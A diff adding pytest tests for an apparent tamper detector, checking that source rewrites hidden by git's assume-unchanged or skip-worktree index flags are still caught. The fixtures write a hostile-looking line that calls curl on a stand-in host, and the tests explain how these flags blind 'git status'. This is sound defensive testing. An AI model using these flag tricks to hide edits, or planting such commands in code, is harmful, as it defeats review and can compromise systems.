@@ -301,6 +301,123 @@ def test_config_reserialization_excused_but_key_change_and_source_edit_caught(
 
 
 # --------------------------------------------------------------------------- #
+# Part A2: index FLAG BITS (assume-unchanged / skip-worktree)
+# --------------------------------------------------------------------------- #
+
+def test_assume_unchanged_bit_hiding_a_rewritten_tracked_file_is_detected(worktree_env):
+    """`git update-index --assume-unchanged` on a tracked file, followed by
+    rewriting that file on disk, leaves `git status --porcelain` EMPTY -- the
+    module docstring's own opening threat (`echo x > calc.py`), with no
+    `.git` artefact involved at all.
+
+    RED-if-removed: the final assertion pins that detection is coming from
+    the NEW `.git/index:`-prefixed entry, not from the pre-existing byte
+    inventory -- deleting the `compare()` index-flags block (or making
+    `_index_flags` return `{}`) makes this test fail, not merely weaken.
+    """
+    wt = worktree_env["wt"]
+
+    # Non-vacuity of the parser: nothing is flagged on a clean, untouched
+    # fixture -- an implementation that flagged every ordinary `H` (cached)
+    # entry would fail here, and would also break the positive control below.
+    assert rw._index_flags(wt, timeout=_TIMEOUT) == {}
+
+    before = rw.snapshot(wt, timeout=_TIMEOUT)
+
+    _git(wt, "update-index", "--assume-unchanged", "src/main.py")
+    (wt / "src" / "main.py").write_text("import os; os.system('curl evil')\n")
+
+    # Premise: porcelain really is blind here. If a future git version stops
+    # being blind, THIS assertion says so, instead of the assertion below
+    # silently passing for the wrong reason.
+    porcelain = _git(wt, "status", "--porcelain")
+    assert porcelain.stdout == "", (
+        "premise failed -- git status --porcelain is no longer blind to an "
+        f"assume-unchanged rewrite: {porcelain.stdout!r}")
+
+    delta = rw.compare(wt, before, timeout=_TIMEOUT)
+    assert not delta.is_empty(), (
+        "an assume-unchanged-hidden rewrite of a tracked source file was "
+        "not detected")
+    offenders = [e for e in delta.modified if e.startswith(".git/index:")]
+    assert any("src/main.py" in e for e in offenders), (
+        f"no .git/index: entry named the tampered path: modified={delta.modified}")
+
+
+def test_skip_worktree_bit_hiding_a_rewritten_tracked_file_is_detected(worktree_env):
+    """`--skip-worktree` is a DISTINCT index flag from assume-unchanged (tag
+    `S`, not a lowercased `H`) and is deliberately not assumed covered by
+    that case -- pinned separately here, same shape as the assume-unchanged
+    test above."""
+    wt = worktree_env["wt"]
+
+    assert rw._index_flags(wt, timeout=_TIMEOUT) == {}
+
+    before = rw.snapshot(wt, timeout=_TIMEOUT)
+
+    _git(wt, "update-index", "--skip-worktree", "src/main.py")
+    (wt / "src" / "main.py").write_text("import os; os.system('curl evil')\n")
+
+    porcelain = _git(wt, "status", "--porcelain")
+    assert porcelain.stdout == "", (
+        "premise failed -- git status --porcelain is no longer blind to a "
+        f"skip-worktree rewrite: {porcelain.stdout!r}")
+
+    delta = rw.compare(wt, before, timeout=_TIMEOUT)
+    assert not delta.is_empty(), (
+        "a skip-worktree-hidden rewrite of a tracked source file was not "
+        "detected")
+    offenders = [e for e in delta.modified if e.startswith(".git/index:")]
+    assert any("src/main.py" in e for e in offenders), (
+        f"no .git/index: entry named the tampered path: modified={delta.modified}")
+
+
+def test_repeated_read_only_git_status_and_diff_still_produce_an_empty_delta(
+    worktree_env,
+):
+    """Positive control: several rounds of read-only `git status`/`git diff`
+    -- exactly what rewrites the index's stat-cache BYTES -- must NOT trip
+    the new flag-bit check. This is the false-positive wall the intake
+    decision to KEEP `index` excluded (rather than byte-watching it) exists
+    to satisfy. `test_benign_git_status_does_not_trigger_reviewer_wrote`
+    covers a single round; this is the explicit repeated-refresh control so a
+    regression here names the flag check, not the byte inventory, as the
+    suspect."""
+    wt = worktree_env["wt"]
+    before = rw.snapshot(wt, timeout=_TIMEOUT)
+
+    for _ in range(3):
+        _git(wt, "status", "--porcelain")
+        _git(wt, "diff")
+        _git(wt, "diff", "--stat")
+        _git(wt, "status")
+
+    delta = rw.compare(wt, before, timeout=_TIMEOUT)
+    assert delta.is_empty(), (
+        "repeated read-only git status/diff (an index stat-cache refresh) "
+        "was reported as tampering -- suspect the new index-flag check: "
+        f"added={delta.added} modified={delta.modified} deleted={delta.deleted}")
+
+
+def test_an_unreadable_index_flag_listing_fails_closed(worktree_env, monkeypatch):
+    """Unparseable `git ls-files -v` output is unverifiable state and must
+    fail closed (raise), never be silently skipped -- the intake decision:
+    "unverifiable state => tampering", not "skip the check"."""
+    wt = worktree_env["wt"]
+    real_run_git = rw._run_git
+
+    def _fake_run_git(repo_path, *args, timeout):
+        if args and args[0] == "ls-files":
+            return "garbage\0"
+        return real_run_git(repo_path, *args, timeout=timeout)
+
+    monkeypatch.setattr(rw, "_run_git", _fake_run_git)
+
+    with pytest.raises(rw.WorktreeCheckFailed, match="unparseable record"):
+        rw.snapshot(wt, timeout=_TIMEOUT)
+
+
+# --------------------------------------------------------------------------- #
 # Part B: hook-safe revert
 # --------------------------------------------------------------------------- #
 
